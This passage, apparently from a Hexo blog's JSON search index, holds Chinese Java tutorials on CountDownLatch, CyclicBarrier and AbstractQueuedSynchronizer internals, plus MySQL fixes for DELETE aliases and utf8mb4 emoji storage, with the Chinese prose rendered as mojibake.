","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"å°ç¨‹åºç ","slug":"å°ç¨‹åºç ","permalink":"http://yoursite.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%81/"}]},{"title":"CountDownLatchå’ŒCyclicBarrieråˆ†æ","slug":"CountDownLatchå’ŒCyclicBarrieråˆ†æ","date":"2019-10-16T07:35:52.000Z","updated":"2020-11-14T17:10:51.576Z","comments":true,"path":"2019/10/16/CountDownLatchå’ŒCyclicBarrieråˆ†æ/","link":"","permalink":"http://yoursite.com/2019/10/16/CountDownLatch%E5%92%8CCyclicBarrier%E5%88%86%E6%9E%90/","excerpt":"","text":"CountDownLatchå‡ ä¸ªç»å¸¸ç”¨çš„æ–¹æ³•åˆ†æCountDownLatchæ„é€ å‡½æ•°public CountDownLatch(int count) { if (count &lt; 0) throw new IllegalArgumentException(&quot;count &lt; 0&quot;); //æ­¤å¤„è°ƒç”¨CountDownLatchçš„é˜Ÿåˆ—åŒæ­¥å™¨ this.sync = new Sync(count); } //è®¾ç½®state Sync(int count) { setState(count); }CountDownLatchçš„await()/** * Causes the current thread to wait until the latch has counted down to * zero, unless the thread is {@linkplain Thread#interrupt interrupted}. * * &lt;p&gt;If the current count is zero then this method returns immediately. * * &lt;p&gt;If the current count is greater than zero then the current * thread becomes disabled for thread scheduling purposes and lies * dormant until one of two things happen: */ //ä¸Šé¢ç¿»è¯‘å¤§æ„æ˜¯ï¼šå½“å‰çº¿ç¨‹ç­‰å¾…ç›´åˆ°stateåˆ°0æ—¶ //é™¤éè¢«æ‰“æ–­ public void await() throws InterruptedException { sync.acquireSharedInterruptibly(1); } //è°ƒç”¨æ¨¡æ¿æ–¹æ³•ä¸­çš„tryAcquireShared(arg) public final void acquireSharedInterruptibly(int arg) throws InterruptedException { if (Thread.interrupted()) throw new InterruptedException(); if (tryAcquireShared(arg) &lt; 0) doAcquireSharedInterruptibly(arg); } //å½“è·å–åˆ°stateæ˜¯å¦ç­‰äº0ï¼Œè¿”å›1æˆ–è€…-1 protected int tryAcquireShared(int acquires) { return (getState() == 0) ? 1 : -1; }CountDownLatchä¸­çš„countDown()/** * Decrements the count of the latch, releasing all waiting threads if * the count reaches zero. * * &lt;p&gt;If the current count is greater than zero then it is decremented. * If the new count is zero then all waiting threads are re-enabled for * thread scheduling purposes. * * &lt;p&gt;If the current count equals zero then nothing happens. */ //å‡å°‘stateæ•°é‡ï¼Œå¦‚æœåˆ°è¾¾0ï¼Œé‡Šæ”¾æ‰€æœ‰æ­£åœ¨ç­‰å¾…çš„çº¿ç¨‹ public void countDown() { sync.releaseShared(1); } public final boolean releaseShared(int arg) { if (tryReleaseShared(arg)) { doReleaseShared(); return true; } return false; } //è¿™æ˜¯CountDownLatchç±»å‹é‡å†™çš„æ¨¡æ¿æ–¹æ³• protected boolean tryReleaseShared(int releases) { // Decrement count; signal when transition to zero for (;;) { int c = getState(); if (c == 0) return false; int nextc = c-1; if (compareAndSetState(c, nextc)) //åªæœ‰ç­‰äº0çš„æ—¶å€™æ‰ä¼šè¿”å›true return nextc == 0; } }CountDownLatchçš„å®˜æ–¹ç¤ºä¾‹* class Driver2 { // ... * void main() throws InterruptedException { * CountDownLatch doneSignal = new CountDownLatch(N); * Executor e = ... * * for (int i = 0; i &lt; N; ++i) // create and start threads * e.execute(new WorkerRunnable(doneSignal, i)); * * doneSignal.await(); // wait for all to finish * } * } * * class WorkerRunnable implements Runnable { * private final CountDownLatch doneSignal; * private final int i; * WorkerRunnable(CountDownLatch doneSignal, int i) { * this.doneSignal = doneSignal; * this.i = i; * } * public void run() { * try { * doWork(i); * doneSignal.countDown(); * } catch (InterruptedException ex) {} // return; * } * * void doWork() { ... } * }}&lt;/pre&gt; *åŸç†æ„é€ å‡½æ•°N,è°ƒç”¨await()å¼€å§‹ï¼ŒçŸ¥é“countDown()Næ¬¡ï¼Œæ‰ä¼šç»§ç»­æ‰§è¡Œåç»­æ“ä½œå…·ä½“åŸç†ï¼Œå°±æ˜¯await()ä¹Ÿå°±æ˜¯lock()å½“å‰çº¿ç¨‹ï¼Œï¼ˆä¸Šè¿°çš„ä¾‹å­ä¸­æ˜¯mainçº¿ç¨‹ï¼‰,åé¢ä¼šè°ƒç”¨countDown()Næ¬¡ï¼Œæ‰ä¼šunlock()å½“å‰çº¿ç¨‹ CyclicBarrierä¾‹å­åŒæ—¶è®¡ç®—Nä¸ªç¤ºä¾‹ï¼Œè®¡ç®—å®ŒNä¸ªç¤ºä¾‹ï¼Œæ‰§è¡Œrunnableé‡Œé¢çš„run()æ–¹æ³•import java.util.Map; import java.util.concurrent.*; public class BankWaterService implements Runnable{ //åˆ›å»º4ä¸ªå±éšœï¼Œå¤„ç†å®Œä¹‹åæ‰§è¡Œå½“å‰ç±»çš„runæ–¹æ³• private CyclicBarrier cyclicBarrier = new CyclicBarrier(4,this); //å‡å¦‚åªæœ‰4ä¸ªsheet,æ‰€ä»¥å¯åŠ¨4ä¸ªçº¿ç¨‹ private ExecutorService executor = Executors.newFixedThreadPool(4); private ConcurrentHashMap&lt;String,Integer&gt; sheetBankWaterCount = new ConcurrentHashMap&lt;String,Integer&gt;(); private void count(){ try { for (int i = 0; i &lt; 4; i++) { executor.execute(new Runnable() { @Override public void run() { //è®¡ç®—å½“å‰iå¯¹åº”çš„sheetçš„é“¶æµæ•°æ®ï¼Œè®¡ç®—ä»£ç çœç•¥ try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } sheetBankWaterCount.put(Thread.currentThread().getName(), 1); //é“¶æµè®¡ç®—å®Œæˆï¼Œæ’å…¥ä¸€ä¸ªå±éšœ try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } } }); } }finally { executor.shutdown(); } } @Override public void run(){ int result = 0; for(Map.Entry&lt;String,Integer&gt; sheet : sheetBankWaterCount.entrySet()){ result += sheet.getValue(); } System.out.println(result); } public static void main(String[] args) { BankWaterService bankWaterService = new BankWaterService(); bankWaterService.count(); } }ä¸Šè¿°ä»£ç ï¼Œæ˜¯ä¸ºäº†æ‰§è¡Œè®¡ç®—å¤šä¸ªsheetä¸­çš„æ•°æ®ï¼Œæœ€åæ‰§è¡Œåˆè®¡ æ¥æµ‹è¯•runnableåˆ°åº•æ˜¯æœ€å…ˆæ‰§è¡Œè¿˜æ˜¯æœ€åæ‰§è¡Œpublic class CyclicBarrierTest2 { static CyclicBarrier cyclicBarrier = new CyclicBarrier(2,new A()); public static void main(String[] args) { new Thread(new Runnable() { @Override public void run() { try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.println(1); } }).start(); try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.println(2); } static class A implements Runnable{ @Override public void run() { System.out.println(3); } } } //è¾“å‡ºç»“æœ 3 1 2æºç åˆ†æè¦çŸ¥é“æºç ä¸­è°ƒç”¨çš„æ˜¯ReentrantLockå¯é‡å…¥å¼é” /** * Main barrier code, covering the various policies. */ private int dowait(boolean timed, long nanos) throws InterruptedException, BrokenBarrierException, TimeoutException { final ReentrantLock lock = this.lock; lock.lock(); try { final Generation g = generation; if (g.broken) throw new BrokenBarrierException(); if (Thread.interrupted()) { breakBarrier(); throw new InterruptedException(); } int index = --count; //å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œäº†å¤šä¸ªawait()ä¹‹åï¼Œå¯¼è‡´count==0æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œä¸‹é¢ä»£ç  if (index == 0) { // tripped boolean ranAction = false; try { final Runnable command = barrierCommand; if (command != null) //è¿™ä¸ªåœ°æ–¹æœ€æç¬‘çš„æ˜¯ä»–ç›´æ¥runäº†ã€‚ command.run(); ranAction = true; //æ­¤å¤„æ˜¯ä¸ºä¸‹ä¸€æ³¢åƒµå°¸æ¥ä¸´åšå‡†å¤‡ nextGeneration(); return 0; } finally { if (!ranAction) breakBarrier(); } } // loop until tripped, broken, interrupted, or timed out for (;;) { try { if (!timed) trip.await(); else if (nanos &gt; 0L) nanos = trip.awaitNanos(nanos); } catch (InterruptedException ie) { if (g == generation &amp;&amp; ! g.broken) { breakBarrier(); throw ie; } else { // We&apos;re about to finish waiting even if we had not // been interrupted, so this interrupt is deemed to // &quot;belong&quot; to subsequent execution. Thread.currentThread().interrupt(); } } if (g.broken) throw new BrokenBarrierException(); if (g != generation) return index; if (timed &amp;&amp; nanos &lt;= 0L) { breakBarrier(); throw new TimeoutException(); } } } finally { lock.unlock(); } } /** * Updates state on barrier trip and wakes up everyone. * Called only while holding lock. */ private void nextGeneration() { // signal completion of last generation trip.signalAll(); // set up next generation //é‡æ–°ç»™countèµ‹äº†å€¼ï¼Œpartiesä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°é‡Œé¢çš„å€¼ count = parties; generation = new Generation(); }await()è¿™ä¸ªè€ƒè™‘æ›´å¤šçš„æ˜¯ï¼Œä½ çš„çº¿ç¨‹ä¸šåŠ¡æ‰§è¡Œå®Œåï¼Œå†è°ƒç”¨await()æ‰å¥½æ‰§è¡Œã€‚ç›´åˆ°æ‰§è¡Œåˆ°æœ€åä¸€ä¸ªï¼Œæ‰ä¼šæ­£åœ¨çš„unlock();å±•ç¤ºä¸€æ³¢ï¼ŒcyclicBarrieré‡ç”¨public class CyclicBarrierTest3 { static class Writer extends Thread{ private CyclicBarrier cyclicBarrier; public Writer(CyclicBarrier cyclicBarrier){ this.cyclicBarrier = cyclicBarrier; } @Override public void run() { System.out.println(&quot;çº¿ç¨‹&quot; + Thread.currentThread().getName() + &quot;æ­£åœ¨å†™å…¥æ•°æ®...&quot;); try { Thread.sleep(5000); System.out.println(&quot;çº¿ç¨‹&quot; + Thread.currentThread().getName() + &quot;å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥&quot;); cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); }catch (BrokenBarrierException e){ e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &quot;æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡&quot;); } } public static void main(String[] args) { int N = 4; CyclicBarrier cyclicBarrier = new CyclicBarrier(N); for(int i = 0 ;i &lt; N ;i++){ new Writer(cyclicBarrier).start(); } try { Thread.sleep(25000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;Cyclicbarrieré‡ç”¨&quot;); for(int i = 0 ;i &lt; N ;i++){ new Writer(cyclicBarrier).start(); } } } //è¾“å‡ºç»“æœ çº¿ç¨‹Thread-0æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-2æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-1æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-3æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-2å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ çº¿ç¨‹Thread-0å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ çº¿ç¨‹Thread-1å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ çº¿ç¨‹Thread-3å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ Thread-2æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Thread-1æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Thread-3æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Thread-0æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Cyclicbarrieré‡ç”¨ çº¿ç¨‹Thread-4æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-5æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-6æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-7æ­£åœ¨å†™å…¥æ•°æ®... çº¿ç¨‹Thread-4å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ çº¿ç¨‹Thread-6å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ çº¿ç¨‹Thread-7å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ çº¿ç¨‹Thread-5å†™å…¥æ•°æ®å®Œæ¯•ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹å†™å…¥ Thread-5æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Thread-4æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Thread-6æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ Thread-7æ‰€æœ‰çº¿ç¨‹å†™å…¥å®Œæ¯•ï¼Œç»§ç»­å¤„ç†å…¶ä»–ä»»åŠ¡ éƒ¨åˆ†ç¤ºä¾‹æ¥è‡ªæµ·å­çš„åšå®¢ è¿˜æœ‰éƒ¨åˆ†ä»£ç æ¥è‡ªï¼šã€Šjavaå¹¶å‘ç¼–ç¨‹çš„è‰ºæœ¯ã€‹ ä¸çŸ¥ä¹‹å¤„ï¼Œæ¬¢è¿å¤§å®¶ç•™è¨€","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"å¹¶å‘","slug":"å¹¶å‘","permalink":"http://yoursite.com/tags/%E5%B9%B6%E5%8F%91/"}]},{"title":"mysqlä¸­deleteåˆ«åé—®é¢˜","slug":"mysqlä¸­deleteåˆ«åé—®é¢˜","date":"2019-10-14T09:46:05.000Z","updated":"2020-11-14T17:10:52.110Z","comments":true,"path":"2019/10/14/mysqlä¸­deleteåˆ«åé—®é¢˜/","link":"","permalink":"http://yoursite.com/2019/10/14/mysql%E4%B8%ADdelete%E5%88%AB%E5%90%8D%E9%97%AE%E9%A2%98/","excerpt":"","text":"delete from table_name t where t.column = 1 # You have an error in your SQL syntax; # check the manual that corresponds to your MySQL server version # for the right syntax to use near &apos;t where t.column = 1&apos; at line 1å‡ºç°äº†è¯­æ³•é”™è¯¯æ­£ç¡®å†™æ³•delete &lt;alias&gt; from &lt;table&gt; &lt;alias&gt; where &lt;alias&gt;.&lt;field&gt;...","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"delete","slug":"delete","permalink":"http://yoursite.com/tags/delete/"}]},{"title":"å¾®ä¿¡æ˜µç§°ä¸­è¡¨æƒ…ä¿å­˜åˆ°æ•°æ®åº“é—®é¢˜","slug":"å¾®ä¿¡æ˜µç§°ä¸­è¡¨æƒ…ä¿å­˜åˆ°æ•°æ®åº“é—®é¢˜","date":"2019-09-30T07:36:45.000Z","updated":"2020-11-14T17:10:52.642Z","comments":true,"path":"2019/09/30/å¾®ä¿¡æ˜µç§°ä¸­è¡¨æƒ…ä¿å­˜åˆ°æ•°æ®åº“é—®é¢˜/","link":"","permalink":"http://yoursite.com/2019/09/30/%E5%BE%AE%E4%BF%A1%E6%98%B5%E7%A7%B0%E4%B8%AD%E8%A1%A8%E6%83%85%E4%BF%9D%E5%AD%98%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E9%97%AE%E9%A2%98/","excerpt":"","text":"å¾®ä¿¡æ˜µç§°ä¸­åŒ…å«è¡¨æƒ…å¯¼è‡´æ— æ³•æ’å…¥æ•°æ®åº“java.sql.SQLException: Incorrect string value: &apos;\\xF0\\x9F\\x8E\\x80&apos; for column &apos;wechat_nick_name&apos;æ³¨æ„ä¿®æ”¹å¾®ä¿¡æ˜µç§°å,è·å–å¾®ä¿¡æ˜µç§°å’Œå¤´åƒæ˜¯æœ‰ç¼“å­˜çš„,æˆ‘è¿™æ¬¡æ˜¯1ä¸ªå°æ—¶,ç¼“å­˜å°±åˆ·æ–°äº† è§£å†³æ­¥éª¤ ä¿®æ”¹å¯¹åº”è¡¨ä¸­çš„ç¼–ç  ALTER TABLE table_name CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ä¿®æ”¹å¯¹åº”å­—æ®µä¸­çš„ç¼–ç  ALTER TABLE table_name CHANGE column_name VARCHAR(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ä¿®æ”¹è¿æ¥æ± ä¸­é…ç½®(æˆ‘ä½¿ç”¨çš„æ˜¯druid) spring: datasource: druid: connection-init-sqls: set names utf8mb4 ä¿®æ”¹æ•°æ®åº“è¿æ¥url datasource: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/databaseName?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&amp;autoReconnect=trueå…¶ä¸­ autoReconnect=true æ€»ç»“,æ¨èæ•°æ®åº“è®¾è®¡æ—¶,ä½¿ç”¨ utf8mb4","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"å¾®ä¿¡æ˜µç§°","slug":"å¾®ä¿¡æ˜µç§°","permalink":"http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1%E6%98%B5%E7%A7%B0/"}]},{"title":"é˜Ÿåˆ—åŒæ­¥å™¨-AbstractQueuedSynchronizer","slug":"é˜Ÿåˆ—åŒæ­¥å™¨-AbstractQueuedSynchronizer","date":"2019-09-26T09:24:23.000Z","updated":"2020-11-14T17:10:53.225Z","comments":true,"path":"2019/09/26/é˜Ÿåˆ—åŒæ­¥å™¨-AbstractQueuedSynchronizer/","link":"","permalink":"http://yoursite.com/2019/09/26/%E9%98%9F%E5%88%97%E5%90%8C%E6%AD%A5%E5%99%A8-AbstractQueuedSynchronizer/","excerpt":"","text":"æ¨¡æ¿æ–¹æ³•è¿™ä¸ªé˜Ÿåˆ—åŒæ­¥å™¨çš„è®¾è®¡å°±æ˜¯åŸºäºæ¨¡æ¿æ–¹æ³• æ¨¡æ¿è®¾è®¡æ¨¡å¼çš„å®šä¹‰ï¼šå®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•çš„æ¡†æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ï¼Œä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜ä¸€ä¸ªç®—æ³•çš„ç»“æ„å³å¯é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚ å¤§è‡´ä»‹ç»åŒæ­¥å™¨ä¾èµ–å†…éƒ¨çš„åŒæ­¥é˜Ÿåˆ—(ä¸€ä¸ªFIFOåŒå‘é˜Ÿåˆ—),æ¥å®ŒæˆåŒæ­¥çŠ¶æ€çš„ç®¡ç†,å½“å‰çº¿ç¨‹è·å–åŒæ­¥çŠ¶æ€å¤±è´¥æ—¶,åŒæ­¥å™¨ä¼šå°†å½“å‰çº¿ç¨‹ä»¥åŠç­‰å¾…ä¿¡æ¯æ”¾å…¥åˆ°ä¸€ä¸ªèŠ‚ç‚¹Nodeå¹¶å°†å…¶åŠ å…¥åŒæ­¥é˜Ÿåˆ—,åŒæ—¶ä¼šé˜»å¡å½“å‰çº¿ç¨‹,ä½†åŒæ­¥çŠ¶æ€é‡Šæ”¾æ—¶,ä¼šå°†é¦–èŠ‚ç‚¹çš„çº¿ç¨‹å”¤é†’,ä½¿å…¶äº§ç”Ÿè·å–åŒæ­¥çŠ¶æ€. åŒæ­¥é˜Ÿåˆ—çš„èŠ‚ç‚¹(Node)ç”¨æ¥ ä¿å­˜è·å–åŒæ­¥çŠ¶æ€å¤±è´¥çš„çº¿ç¨‹å¼•ç”¨ ,ç­‰å¾…çŠ¶æ€ä»¥åŠå‰é©±å’Œåé©±èŠ‚ç‚¹,ç»“ç‚¹çš„å±æ€§ç±»å‹ä¸åç§°ä»¥åŠæè¿°. static final class Node { //ç­‰å¾…çŠ¶æ€ volatile int waitStatus; //å‰é©± volatile Node prev; //åé©± volatile Node next; //è·å–åŒæ­¥çŠ¶æ€å¤±è´¥çš„çº¿ç¨‹å¼•ç”¨ volatile Thread thread; Node nextWaiter; }èŠ‚ç‚¹æ˜¯æ„æˆåŒæ­¥é˜Ÿåˆ—çš„åŸºç¡€,åŒæ­¥å™¨æ‹¥æœ‰é¦–èŠ‚ç‚¹å’Œå°¾ç»“ç‚¹,æ²¡æœ‰æˆåŠŸè·å–åŒæ­¥çŠ¶æ€çš„çº¿ç¨‹å°†ä¼šåŠ å…¥è¯¥é˜Ÿåˆ—çš„å°¾éƒ¨. è¯•æƒ³ä¸€ä¸‹,ä¸€ä¸ªçº¿ç¨‹è·å–åŒæ­¥çŠ¶æ€æˆåŠŸ,å…¶ä»–çº¿ç¨‹æ— æ³•è·å–åŒæ­¥çŠ¶æ€,è½¬è€Œå»æ„é€ ç»“ç‚¹å¹¶åŠ å…¥åŒæ­¥é˜Ÿåˆ—,è€ŒåŠ å…¥é˜Ÿåˆ—å¿…é¡»æ˜¯çº¿ç¨‹å®‰å…¨çš„(å› ä¸ºè¿™ä¸ªå¯èƒ½æ˜¯ç«äº‰çš„,å¾ˆå¤šçº¿ç¨‹æ²¡è·å–åˆ°,ç„¶åç«äº‰åŠ å…¥é˜Ÿåˆ—).åŒæ­¥å™¨æä¾›äº†åŸºäºCASçš„è®¾ç½®å°¾ç»“ç‚¹çš„æ–¹æ³•:compareAndSetTail(Node except,Node Update) @Override protected boolean tryAcquire(int arg) { if(compareAndSetState(0,1)){ setExclusiveOwnerThread(Thread.currentThread()); return true; } return false; }ä¸Šé¢è¿™ä¸ªæ˜¯æŸä¸ªé‡å†™ tryAcquire(int arg) æ–¹æ³•çš„. åŒæ­¥é˜Ÿåˆ—éµå¾ªFIFO. ç‹¬å å¼è·å–åŒæ­¥çŠ¶æ€é€šè¿‡è°ƒç”¨åŒæ­¥å™¨çš„acquire(intarg)æ–¹æ³•å¯ä»¥è·å–åŒæ­¥çŠ¶æ€,è¯¥æ–¹æ³•å¯¹ä¸­æ–­ä¸æ•æ„Ÿ,ä¹Ÿå°±æ˜¯ç”±äºçº¿ç¨‹è·å–åŒæ­¥çŠ¶æ€å¤±è´¥åè¿›å…¥åŒæ­¥é˜Ÿåˆ—,åç»­å¯¹çº¿ç¨‹è¿›è¡Œä¸­æ–­æ“ä½œæ—¶,çº¿ç¨‹ä¸ä¼šä»åŒæ­¥é˜Ÿåˆ—ä¸­ç§»é™¤ public final void acquire(int arg) { if (!tryAcquire(arg) &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } //è¯¥æ–¹æ³•å°±æ˜¯åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹,ç„¶åè¯•å›¾å»åˆ›å»ºä¸€ä¸ªåŒå‘é“¾è¡¨çš„å°¾ç»“ç‚¹ private Node addWaiter(Node mode) { Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure //æ­¤å¤„å¯ä»¥çœ‹åˆ°,å®ƒåœ¨åˆ›å»ºæˆåŠŸåä¼šç«‹åˆ»å°è¯•å»åŠ å…¥å°¾ç»“ç‚¹,å¦‚æœå¤±è´¥å°±ä¼šè¿›å…¥ä¸‹é¢çš„enqçš„forå¾ªç¯é‡Œé¢ Node pred = tail; if (pred != null) { node.prev = pred; if (compareAndSetTail(pred, node)) { pred.next = node; return node; } } enq(node); return node; } private Node enq(final Node node) { for (;;) { Node t = tail; if (t == null) { // Must initialize //å¦‚æœé¦–èŠ‚ç‚¹ä¸å­˜åœ¨,å°±åˆ›å»ºå®ƒ, if (compareAndSetHead(new Node())) tail = head; } else { //æ­¤å¤„å°±æ˜¯forå¾ªç¯æ’å…¥ä¸ºèŠ‚ç‚¹,CASå¼å¿…å°†å¹¶è®¾ç½® node.prev = t; if (compareAndSetTail(t, node)) { t.next = node; return t; } } } } /** * Convenience method to interrupt current thread. é˜»å¡å½“å‰çº¿ç¨‹ */ static void selfInterrupt() { Thread.currentThread().interrupt(); } final boolean acquireQueued(final Node node, int arg) { boolean failed = true; try { boolean interrupted = false; for (;;) { //å½“å‰ç»“ç‚¹çš„å‰é©±ç»“ç‚¹p, final Node p = node.predecessor(); //å¦‚æœpæ˜¯å¤´ç»“ç‚¹,å¹¶ä¸”å°è¯•è·å– if (p == head &amp;&amp; tryAcquire(arg)) { //è·å–æˆåŠŸ,å°†è¯¥ç»“ç‚¹è®¾ç½®ä¸ºå¤´ç»“ç‚¹ setHead(node); p.next = null; // help GC failed = false; return interrupted; } if (shouldParkAfterFailedAcquire(p, node) &amp;&amp; parkAndCheckInterrupt()) interrupted = true; } } finally { if (failed) cancelAcquire(node); } } private void setHead(Node node) { //èµ‹ç»™å¤´ç»“ç‚¹ head = node; node.thread = null; node.prev = null; }ä¸Šè¿°ä»£ç ä¸»è¦é€»è¾‘æ˜¯:é¦–å…ˆè°ƒç”¨ è‡ªå®šä¹‰åŒæ­¥å™¨å®ç°çš„tryAcquire(int arg)æ–¹æ³•,è¯¥æ–¹æ³•ä¿è¯çº¿ç¨‹å®‰å…¨çš„è·å–åŒæ­¥çŠ¶æ€,å¦‚æœåŒæ­¥çŠ¶æ€è·å–å¤±è´¥å°±æ„é€ ä¸€ä¸ªåŒæ­¥èŠ‚ç‚¹(ç‹¬å å¼çš„Node.EXCLUSIVE,åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹è·å–åŒæ­¥çŠ¶æ€æˆåŠŸ)å¹¶é€šè¿‡addWriter(Nodenode)æ–¹æ³•å°†è¯¥ç»“ç‚¹åŠ å…¥åŒæ­¥é˜Ÿåˆ—å°¾éƒ¨,æœ€åè°ƒç”¨acquireQueued(Node node,intarg),ä½¿å¾—è¯¥ç»“ç‚¹ä»¥æ­»å¾ªç¯æ–¹å¼è·å–é€šè¿‡çŠ¶æ€.æœ€å,å¦‚æœè·å–ä¸åˆ°åŒæ­¥çŠ¶æ€,å°±é˜»å¡ç»“ç‚¹ä¸­çš„çº¿ç¨‹,è€Œè¢«é˜»å¡çº¿ç¨‹çš„å”¤é†’ä¸»è¦ä¾é å‰é©±ç»“ç‚¹çš„å‡ºé˜Ÿæˆ–é˜»å¡çº¿ç¨‹è¢«ä¸­æ–­æ¥å®ç°.å¯ä»¥çœ‹å‡º,enq(final Node node)æ–¹æ³•å°†å¹¶å‘æ·»åŠ åŠè¯¶åˆ°å“ª çš„è¯·æ±‚é€šè¿‡CASå˜å¾—â€â€ä¸²è¡ŒåŒ– ç”±äºéé¦–èŠ‚ç‚¹çº¿ç¨‹å‰é©±ç»“ç‚¹å‡ºé˜Ÿæˆ–è€…è¢«ä¸­æ–­è€Œä»ç­‰å¾…çŠ¶æ€è¿”å›,éšåæ£€æŸ¥è‡ªå·±çš„å‰é©±æ˜¯å¦æ˜¯å¤´ç»“ç‚¹,å¦‚æœæ˜¯å°±å°è¯•è·å–åŒæ­¥çŠ¶æ€.å¯ä»¥çœ‹å‡º,èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ä¹‹é—´åœ¨å¾ªç¯æ£€æŸ¥ä¸­æ˜¯äº’ç›¸ä¸é€šä¿¡çš„,è€Œæ­£æ˜¯æ£€æŸ¥è‡ªå·±çš„å‰é©±æ˜¯å¦æ˜¯å¤´ç»“ç‚¹,è¿™æ ·å°±å¯ä»¥ä½¿å¾—èŠ‚ç‚¹çš„é‡Šæ”¾è§„åˆ™ç¬¦åˆFIFO,å¹¶ä¸”ä¹Ÿä¾¿äºå¯¹è¿‡æ—©é€šçŸ¥çš„å¤„ç†(è¿‡æ—©é€šçŸ¥æ˜¯æŒ‡å‰é©±èŠ‚ç‚¹ä¸æ˜¯å¤´ç»“ç‚¹çš„çº¿ç¨‹ç”±äºç»ˆç«¯è¢«å”¤é†’) åŒæ­¥å™¨releaseæ–¹æ³•public final boolean release(int arg) { if (tryRelease(arg)) { Node h = head; if (h != null &amp;&amp; h.waitStatus != 0) unparkSuccessor(h); return true; } return false; } private void unparkSuccessor(Node node) { /* * If status is negative (i.e., possibly needing signal) try * to clear in anticipation of signalling. It is OK if this * fails or if status is changed by waiting thread. */ int ws = node.waitStatus; if (ws &lt; 0) compareAndSetWaitStatus(node, ws, 0); /* * Thread to unpark is held in successor, which is normally * just the next node. But if cancelled or apparently null, * traverse backwards from tail to find the actual * non-cancelled 